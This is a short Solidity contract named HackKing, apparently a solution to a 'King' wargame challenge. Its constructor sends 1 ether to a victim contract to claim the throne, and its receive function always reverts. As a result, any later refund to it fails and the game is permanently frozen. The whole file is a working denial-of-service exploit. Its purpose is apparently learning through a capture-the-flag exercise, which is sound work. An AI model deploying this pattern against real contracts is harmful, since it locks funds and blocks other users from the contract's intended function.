contract HackKing {
    
    constructor(address payable _victim) public payable {
        _victim.call.gas(1000000).value(1 ether)("");
    }
    
    receive() external payable {
        revert();
    }
}
